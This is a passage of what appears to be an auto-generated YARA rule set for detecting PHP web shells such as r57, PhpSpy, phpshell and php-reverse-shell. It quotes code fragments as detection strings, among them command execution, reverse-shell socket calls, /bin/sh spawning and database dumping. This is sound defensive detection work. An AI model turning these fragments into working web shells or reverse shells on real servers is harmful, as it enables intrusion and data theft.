      $s4 = "makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));" fullword ascii
      $s5 = "' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '').\"</span></td>\");" fullword ascii
      $s6 = "mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s7 = "mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s8 = "if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {" fullword ascii
      $s9 = "formhead(array('name'=>'fileopform', 'target'=>'_blank'));" fullword ascii
      $s10 = "header(\"content-Type: text/html; charset=euc-kr\");" fullword ascii
      $s11 = "header(\"content-Type: text/html; charset=euc-jp\");" fullword ascii
      $s12 = "p(' | View Writable ( <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'dir\\');\">Directory</a>');" fullword ascii
      $s13 = "p('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\');\">'.$table['Name'].'</a></td>');" fullword ascii
      $s14 = "if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {" fullword ascii
      $s15 = "if ($_COOKIE['loginpass']) {" fullword ascii
      $s16 = "makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));" fullword ascii
      $s17 = "p(' | <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'file\\');\">File</a> )');" fullword ascii
      $s18 = "$query = str_replace(\" LIMIT \", \" order by $keyfied DESC LIMIT \", $query);" fullword ascii
      $s19 = "$fileurl = str_replace($_SERVER[\"DOCUMENT_ROOT\"],'',$filedb['server_link']);" fullword ascii
      $s20 = "$filedata = GetSFileList($nowpath, $findstr, $re);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _phpshell_phpshell3_36
{
   meta:
      description = "php22 - from files phpshell.php, phpshell3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e26e1c840e27ae885aecd616389964de0dd0bd4de6a74a5f6cc7a5506c08e26a"
      hash2 = "cbc57f72e7eb7466470260e0f41fba4210ff11041981f20fb45aa2662f1abcec"
   strings:
      $s1 = "* as an internal shell command. */" fullword ascii
      $s2 = "document.shell.command.value = command_hist[current_line];" fullword ascii
      $s3 = "command_hist[current_line] = document.shell.command.value;" fullword ascii
      $s4 = "document.shell.command.focus();" fullword ascii
      $s5 = "/* Build the command history for use in the JavaScript */" fullword ascii
      $s6 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"post\">" fullword ascii
      $s7 = "document.shell.output.scrollTop = document.shell.output.scrollHeight;" fullword ascii
      $s8 = "/* The current command is a 'cd' command which we have to handle" fullword ascii
      $s9 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii
      $s10 = "document.shell.setAttribute(\"autocomplete\", \"off\");" fullword ascii
      $s11 = "var command_hist = new Array(<?php echo $js_command_hist ?>);" fullword ascii
      $s12 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[1])," fullword ascii
      $s13 = "$_SESSION['output'] .= htmlspecialchars(fgets($io[2])," fullword ascii
      $s14 = "* changing the directory and save the output. */" fullword ascii
      $s15 = "Place - Suite 330, Boston, MA  02111-1307, USA." fullword ascii
      $s16 = "$new_dir = preg_replace('|/?[^/]+/\\.\\.(?!\\.)|', '', $new_dir);" fullword ascii
      $s17 = "/* Now append the commmand to the output. */" fullword ascii
      $s18 = "$js_command_hist = '\"\", \"' . implode('\", \"', $escaped) . '\"';" fullword ascii
      $s19 = "$js_command_hist = '\"\"';" fullword ascii
      $s20 = "<?php // -*- coding: utf-8 -*-" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _PHANTASMA_php_include_w_shell_37
{
   meta:
      description = "php22 - from files PHANTASMA.php, php-include-w-shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bf35afacafd3b981dfb6d36f5be4b4e2cb0590c657c0817b4669cb81e1ec24a5"
      hash2 = "76f73c912c4f17deab191014b82ced4f85cff1ce9461931ca7bda842c95b3e5a"
   strings:
      $s1 = "\"  printf(\\\"[*] Dumping Arguments\\\\n\\\");\\n\" ." fullword ascii
      $s2 = "\"  char msg[ ] = \\\"Welcome to Data Cha0s Connect Back Shell\\\\n\\\\n\\\"\\n\" ." fullword ascii
      $s3 = "\"  printf(\\\"[*] Spawning Shell\\\\n\\\");\\n\" ." fullword ascii
      $s4 = "\"                \\\"Issue \\\\\\\"export TERM=xterm; exec bash -i\\\\\\\"\\\\n\\\"\\n\" ." fullword ascii
      $s5 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword ascii
      $s6 = "\"    execl(\\\"/bin/sh\\\", \\\"shell\\\", NULL);\\n\" ." fullword ascii
      $s7 = "\"  he = gethostbyname(host);\\n\" ." fullword ascii
      $s8 = "\"                \\\"For Not Getting Logged.\\\\n(;\\\\n\\\\n\\\";\\n\" ." fullword ascii
      $s9 = "\"  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\\n\" ." fullword ascii
      $s10 = "\"  printf(\\\"[*] Resolving Host Name\\\\n\\\");\\n\" ." fullword ascii
      $s11 = "\"  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\\n\" ." fullword ascii
      $s12 = "\"    printf(\\\"[-] Unable to Resolve: %s\\\\n\\\", host);\\n\" ." fullword ascii
      $s13 = "\"  if (!(host = (char *) malloc(l))) {\\n\" ." fullword ascii
      $s14 = "\"  printf(\\\"Data Cha0s Connect Back Backdoor\\\\n\\\\n\\\");\\n\" ." fullword ascii
      $s15 = "\"                \\\"For More Reliable Shell.\\\\n\\\"\\n\" ." fullword ascii
      $s16 = "\"  strncpy(host, argv[1], l);\\n\" ." fullword ascii
      $s17 = "\"  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\\n\" ." fullword ascii
      $s18 = "$shell = \"#include <stdio.h>\\n\" ." fullword ascii
      $s19 = "\"  struct hostent *he;\\n\" ." fullword ascii
      $s20 = "@$get = fgets($sock[$cont]);" fullword ascii
   condition:
      ( ( uint16(0) == 0x433c or uint16(0) == 0x3f3c ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpshell17_phpshell17_php_38
{
   meta:
      description = "php22 - from files phpshell17.php, phpshell17.php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d11afed102f8d0196ae6254542ee6d2603829065822d8c841c9a3b6dceedb74b"
      hash2 = "7485c14c8f970b9faba9eb5cf9c458d7a49fd6ad13e12e26cd322fe3021086e4"
   strings:
      $x1 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii
      $x2 = "PHP Shell is aninteractive PHP-page that will execute any command" fullword ascii
      $s3 = "entered. See the files README and INSTALL or http://www.gimpster.com" fullword ascii
      $s4 = "<h1>[YOUR HEADER[ <?php echo PHPSHELL_VERSION ?> [ADITTIONAL TEXT] -" fullword ascii
      $s5 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></title>" fullword ascii
      $s6 = "Copyright (C) 2000-2002 Martin Geisler < gimpster@gimpster.com>" fullword ascii
      $s7 = "* PHP Shell *" fullword ascii
      $s8 = "/* We try and match a cd command. */" fullword ascii
      $s9 = "$Id: phpshell.php,v 1.18 2002/09/18 15:49:54 gimpster Exp $" fullword ascii
      $s10 = "/* Run through all the files and directories to find the dirs. */" fullword ascii
      $s11 = "<p>Command: <input type=\"text\" name=\"command\" size=\"60\">" fullword ascii
      $s12 = "<form name=\"myform\" action=\"<?php echo $PHP_SELF ?>\" method=\"post\">" fullword ascii
      $s13 = "Place - Suite 330, Boston, MA 02111-1307, USA." fullword ascii
      $s14 = "system($command);" fullword ascii
      $s15 = "define('PHPSHELL_VERSION', '1.7');" fullword ascii
      $s16 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword ascii
      $s17 = "/* First we check if there has been asked for a working directory. */" fullword ascii
      $s18 = "[ADDITIONAL TEXT]</h1><br><hr><marquee><b>[ADDITIONAL MESSEGE OR TEXT]</b></marquee><hr><br>" fullword ascii
      $s19 = "/* We do a little bit of string-manipulation to find the parent" fullword ascii
      $s20 = "/* work_dir is only 1 charecter - it can only be / There" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 10KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57__15__r57_r577_r57shell_r57shell127_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf035_39
{
   meta:
      description = "php22 - from files r57 (15).php, r57.php, r577.php, r57shell.php, r57shell127.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash2 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash3 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash4 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash5 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash6 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash7 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash8 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash9 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash10 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash11 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash12 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash13 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
      hash14 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s2 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"" fullword ascii
      $s3 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s4 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s5 = "@copy($HTTP_POST_FILES['userfile']['tmp_name']," fullword ascii
      $s6 = "else if(empty($_POST['cmd'])&&$safe_mode){ $_POST['cmd']=\"safe_dir\"; }" fullword ascii
      $s7 = "else { $nfn = $HTTP_POST_FILES['userfile']['name']; }" fullword ascii
      $s8 = "if (!empty($HTTP_POST_FILES['userfile']['name']))" fullword ascii
      $s9 = "else { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s10 = "if(!$file=@fopen($_POST['e_name'],\"r+\")) { $only_read = 1; @fclose($file); }" fullword ascii
      $s11 = "$sql = \"SELECT * FROM temp_r57_table;\";" fullword ascii
      $s12 = "echo @htmlspecialchars(@fread($file,@filesize($_POST['e_name'])));" fullword ascii
      $s13 = "$sql = \"DROP TABLE IF EXISTS temp_r57_table;\";" fullword ascii
      $s14 = "$sql = \"CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );\";" fullword ascii
      $s15 = "if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }" fullword ascii
      $s16 = "if(!$file=@fopen($_POST['e_name'],\"w\")) { echo we($_POST['e_name']); }" fullword ascii
      $s17 = "echo ws(3).@get_current_user().\"<br>\";" fullword ascii
      $s18 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_size($all).\"</b>\";" fullword ascii
      $s19 = "if($windows) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w')).\"\\n\"; }" fullword ascii
      $s20 = "$ci = @curl_init(\"file://\".$_POST['test1_file'].\"\");" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57__15__r57_bd_r57_r577_r57shell1_40_r57shell127_r57shell2_0_r57shell_v_1_42_edited_by_kibngdefacer_r57_1php_r_40
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57 (15).php, r57-bd.php, r57.php, r577.php, r57shell1.40.php, r57shell127.php, r57shell2.0.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_1php.php, r57_4.php, r57_iFX.php, r57_kartal.php, r57_Mohajer22.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "ffca7aeeab1e56ff8010a15f1511e8bcea90cfdcc84248e18d53dacde04cf08b"
      hash3 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash4 = "1b92b1abcca09ac8d7d4d3b3c05e4decec11a31e4b71157305979e67df63bc7f"
      hash5 = "93b5f77fcdd31be1a1384c2a942514e83bc5788b523e544b093ae0e56fe9561a"
      hash6 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash7 = "9a4f47269ef5fc12c128532307d33ff528b0445929acbeff19148e8cf69456b8"
      hash8 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash9 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash10 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash11 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
      hash12 = "c4dadade5cd680bd6ac7ba5854d65b751feccc5c3a2300c69c3a7965b6c1d5ef"
      hash13 = "8113587c0c5860fb6c1fe2cc2fd610cde85b28ffa1d5fdee1ef26b956c382894"
      hash14 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
      hash15 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "'eng_text41'=>'Save dump in file'," fullword ascii
      $s2 = "'eng_text9' =>'Bind port to /bin/bash'," fullword ascii
      $s3 = "'eng_text37'=>'Login'," fullword ascii
      $s4 = "'eng_butt9' =>'Dump'," fullword ascii
      $s5 = "'eng_text68'=>'Command'," fullword ascii
      $s6 = "'eng_text38'=>'Password'," fullword ascii
      $s7 = "'eng_text24'=>'Remote host'," fullword ascii
      $s8 = "'eng_text48'=>'Delete temp files'," fullword ascii
      $s9 = "'eng_text15'=>'Upload files from remote server'," fullword ascii
      $s10 = "'eng_text47'=>'Show variables from php.ini'," fullword ascii
      $s11 = "'eng_text49'=>'Delete script from server'," fullword ascii
      $s12 = "'eng_text19'=>'Exploits'," fullword ascii
      $s13 = "'eng_text14'=>'Port'," fullword ascii
      $s14 = "'eng_text10'=>'Port'," fullword ascii
      $s15 = "'eng_butt5' =>'Run'," fullword ascii
      $s16 = "'eng_butt3' =>'Bind'," fullword ascii
      $s17 = "'eng_text44'=>'Can\\'t edit file! Only read access!'," fullword ascii
      $s18 = "'eng_text76'=>'Search text in files via find'," fullword ascii
      $s19 = "'eng_butt2' =>'Upload'," fullword ascii
      $s20 = "'eng_text54'=>'Find text in files'," fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57_bd_r57shell_r57shell1_40_r57shell2_0_r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3_r57Shell_0fa5df7bbf0_41
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57-bd.php, r57shell.php, r57shell1.40.php, r57shell2.0.php, r57Shell_0de93ccddbeddbea5954e4dacb37a6a9d343c1b3.php, r57Shell_0fa5df7bbf035cb307867a5b5e783abfb0158976.php, r57Shell_a5f8c9622eaae6ad40454b3605c37b10483c836b.php, r57shell_v.1.42_edited_by_kibngdefacer.php, r57_Mohajer22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "b5ae25fc5a43fc95297ee6477b18e3c44dbdafca5ba424c24a9680a8560a8ba1"
      hash5 = "20ccd077d37e8789dd9ed08fb9d126547c2b16715d9891d90ebf8f9372c323e7"
      hash6 = "c567ec472c68a604d58bd14864487871556bcff7c26b9640b3bf032955e7dddc"
      hash7 = "b54be385d814a2deefc5f788255c6f58fffc7855d8d530b937679eec2eabcf14"
      hash8 = "6b2de11c6a60289616c2fc9ea44cc0c70dc0f19dac7cd85767e05aef42833d2d"
      hash9 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
      hash10 = "a5127bc0ac6c8ec4c570ca8763be7f6cc051338f418ccef777542e05824cb16a"
   strings:
      $s1 = "$this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);" fullword ascii
      $s2 = "$this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);" fullword ascii
      $s3 = "$this->dump[2] = '##  Created: '.date (\"d/m/Y H:i:s\");" fullword ascii
      $s4 = "echo sr(35,\"<b>\".$lang[$language.'_text84'].$arrow.\"</b>\".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),\"\");" fullword ascii
      $s5 = "if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;" fullword ascii
      $s6 = "$str = \"host='\".$this->host.\"' port='\".$this->port.\"' user='\".$this->user.\"' password='\".$this->pass.\"' dbname='\".$thi" ascii
      $s7 = "$this->dump[3] = '## Database: '.$this->base;" fullword ascii
      $s8 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s9 = "if($unix) $_POST['e_text']=@str_replace(\"\\r\\n\",\"\\n\",$_POST['e_text']);" fullword ascii
      $s10 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['t" ascii
      $s11 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['t" ascii
      $s12 = "$this->dump=array();" fullword ascii
      $s13 = "function dump($table)" fullword ascii
      $s14 = "if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;" fullword ascii
      $s15 = "echo in('hidden','db_server',0,$_POST['db_server']);" fullword ascii
      $s16 = "if(@mysql_select_db($this->base,$this->connection)) return 1;" fullword ascii
      $s17 = "if(@mssql_select_db($this->base,$this->connection)) return 1;" fullword ascii
      $s18 = "$this->dump[4] = '##    Table: '.$table;" fullword ascii
      $s19 = "if(false===($this->res=@pg_query($this->connection,$query)))" fullword ascii
      $s20 = "if(false===($this->res=@ociparse($this->connection,$query)))" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c0a ) and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhpSpyVer2006_phpspy_2006_PhpSpy_Ver_2006_42
{
   meta:
      description = "php22 - from files PhpSpyVer2006.php, phpspy_2006.php, PhpSpy_Ver_2006.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cdb2650f3e0f6e7e2bc112329f142c9171c953ba62f849f3f16a0f65ec9a8e6f"
      hash2 = "b0a12e6daee4649ae1ee375c6b6fde658add204d0d521bc208906385d83036e3"
      hash3 = "b0dcae77eabc407c53c0b2b6fe74d0749bc2fa4fd9a560b40400a64d2959492c"
   strings:
      $s1 = "header(\"Content-Disposition: attachment;filename=\".$_SERVER['HTTP_HOST'].\"_Files.tar.gz\");" fullword ascii
      $s2 = "$tb->tdbody('URL: '.$tb->makeinput('url','http://www.4ngel.net','','text','100').' '.$tb->makeinput('','" fullword ascii
      $s3 = "$filename = basename($_SERVER['HTTP_HOST'].\"_MySQL.sql\");" fullword ascii
      $s4 = ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td col" ascii
      $s5 = "| Thx FireFox (http://www.molyx.com)                                       |" fullword ascii
      $s6 = "<td align=\\\"\".$align.\"\\\"\".$height.\" \".$colspan.\" \".$extra.\">\".$content.\"</td>\\n\";" fullword ascii
      $s7 = "span=\"2\"><input type=\"radio\" name=\"backuptype\" value=\"download\"> " fullword ascii
      $s8 = "ec'=>'shell_exec','popen'=>'popen');" fullword ascii
      $s9 = "\" src=\"http://www.4ngel.net\"></iframe>');" fullword ascii
      $s10 = "ll_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_ex" ascii
      $s11 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'she" ascii
      $s12 = "$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'she" ascii
      $s13 = "n=\"right\"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');" fullword ascii
      $s14 = "('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>" fullword ascii
      $s15 = "$tb->tdbody('<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td>" ascii
      $s16 = ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td col" ascii
      $s17 = "','onclick=\"CheckAll(this.form)\"','checkbox','30','').' '.$tb->makeinput('downrar','" fullword ascii
      $s18 = "$tb->tdbody('<a href=\"?action=logout\">" fullword ascii
      $s19 = "$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" ascii
      $s20 = "<td align=\\\"center\\\"><b>\".$title.\" [<a href=\\\"?dir=\".urlencode($dir).\"\\\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _pak_php_reverse_shell_43
{
   meta:
      description = "php22 - from files pak.php, php-reverse-shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cd89bf53903562bcc5245ed797c8c7e936e7198344b291b9c9bea84416eb9b2"
      hash2 = "b9a06b941da7bef9697ad1e645dc3b15b56e35407a0590e4ec18b8f3543645d9"
   strings:
      $s1 = "// Spawn shell process" fullword ascii
      $s2 = "0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from" fullword ascii
      $s3 = "$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);" fullword ascii
      $s4 = "1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to" fullword ascii
      $s5 = "$read_a = array($sock, $pipes[1], $pipes[2]);" fullword ascii
      $s6 = "// data to process's STDIN" fullword ascii
      $s7 = "// Wait until a command is end down $sock, or some" fullword ascii
      $s8 = "printit(\"ERROR: Can't spawn shell\");" fullword ascii
      $s9 = "// command output is available on STDOUT or STDERR" fullword ascii
      $s10 = "$input = fread($pipes[2], $chunk_size);" fullword ascii
      $s11 = "$input = fread($pipes[1], $chunk_size);" fullword ascii
      $s12 = "if (in_array($pipes[2], $read_a)) {" fullword ascii
      $s13 = "if (in_array($pipes[1], $read_a)) {" fullword ascii
      $s14 = "// Reason: Occsionally reads will block, even though stream_select tells us they won't" fullword ascii
      $s15 = "// If we can read from the process's STDERR" fullword ascii
      $s16 = "// If we can read from the process's STDOUT" fullword ascii
      $s17 = "// Open reverse connection" fullword ascii
      $s18 = "// Do the reverse shell..." fullword ascii
      $s19 = "2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to" fullword ascii
      $s20 = "$sock = fsockopen($ip, $port, $errno, $errstr, 30);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x633c ) and filesize < 40KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell_php_php_r57_Shell_44
{
   meta:
      description = "php22 - from files r57shell.php.php.php, r57_Shell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c44c721c1a723960f8509c2fe4d9ea18a73a0fa0e363fee34b7597ec869017aa"
      hash2 = "d0819e45f7c6acf3bd0b8dcf49ee4f3ba4edd152038a84043752eea3f04afa39"
   strings:
      $s1 = "/* command execute form */" fullword ascii
      $s2 = "/* command execute */" fullword ascii
      $s3 = "echo \"<div align=center><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RusH security team | <a href=http://rst.vo" ascii
      $s4 = "/* file upload from remote host form */" fullword ascii
      $s5 = "/* file upload from remote host */" fullword ascii
      $s6 = "header(\"WWW-Authenticate: Basic realm=\\\"r57shell\\\"\");" fullword ascii
      $s7 = "/* alias execute */" fullword ascii
      $s8 = "echo \"<form name=remote_upload method=POST>\";" fullword ascii
      $s9 = "/* -------------------------[ EOF ]------------------------- */" fullword ascii
      $s10 = "<!-- logo -->" fullword ascii
      $s11 = "echo \"<form name=command method=post>\";" fullword ascii
      $s12 = "/* port bind form */" fullword ascii
      $s13 = "/* port bind Perl */" fullword ascii
      $s14 = "/* port bind C */" fullword ascii
      $s15 = "echo \"<form name=bind method=POST>\";" fullword ascii
      $s16 = "config.inc.php */" fullword ascii
      $s17 = "echo \"<div align=center><textarea name=report cols=121 rows=15>\";" fullword ascii
      $s18 = "/* back connect Perl */" fullword ascii
      $s19 = "/* back connect form */" fullword ascii
      $s20 = "/* back connect C */" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _PodsData_PodsData_45
{
   meta:
      description = "php22 - from files PodsData.php, PodsData.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53f92e0e8750eaeb1403afec1b6c7a194872430c70c9f4c864b4aa69157b26e8"
      hash2 = "53f92e0e8750eaeb1403afec1b6c7a194872430c70c9f4c864b4aa69157b26e8"
   strings:
      $s1 = "&& ( 'pick' != $traverse[ 'type' ] || !in_array( pods_var( 'pick_object', $traverse ), $simple_tableless_objects ) )" fullword ascii
      $s2 = "( $traverse_recurse[ 'depth' ] + 2 ) == count( $traverse_recurse[ 'fields' ] )" fullword ascii
      $s3 = "if ( 'pick' == $attributes[ 'type' ] && !in_array( pods_v( 'pick_object', $attributes ), $simple_tableless_objects ) ) {" fullword ascii
      $s4 = "elseif ( !empty( $params->object_fields ) && !isset( $params->object_fields[ $field ] ) && 'meta' == $pod['storage'] )" fullword ascii
      $s5 = "$where[] = \"{$fieldfield} LIKE '%\" . pods_sanitize_like( $params->search_query ) . \"%'\";" fullword ascii
      $s6 = "$having[] = \"{$fieldfield} LIKE '%\" . pods_sanitize_like( $params->search_query ) . \"%'\";" fullword ascii
      $s7 = ". \" OR {$filterfield} LIKE '%\\\"\" . pods_sanitize_like( $filter_v ) . \"\\\"%' )\";" fullword ascii
      $s8 = "$pod_data[ 'fields' ][ $field ] = $pod_data[ 'object_fields' ][ $field ];" fullword ascii
      $s9 = "$simple_tableless_objects = PodsForm::simple_tableless_objects();" fullword ascii
      $s10 = "if ( empty( $attributes[ 'table_info' ][ 'field_index' ] ) )" fullword ascii
      $s11 = "$haystack = preg_replace( '/\\s/', ' ', $haystack );" fullword ascii
      $s12 = "$haystack = preg_replace( '/\\w\\(/', ' ', $haystack );" fullword ascii
      $s13 = "elseif ( isset( $wpdb->field_types[ $field ] ) )" fullword ascii
      $s14 = "$error = 'Database Error';" fullword ascii
      $s15 = "$field_compare = '!=';" fullword ascii
      $s16 = "$joined_index = $table_info[ 'field_index' ];" fullword ascii
      $s17 = "$value = str_replace( '`', '', $value );" fullword ascii
      $s18 = "$fieldfield = $fieldfield . '.`meta_value`';" fullword ascii
      $s19 = "$filterfield = $filterfield . '.`meta_value`';" fullword ascii
      $s20 = "elseif ( isset( $params->fields[ $field ] ) ) {" fullword ascii
   condition:
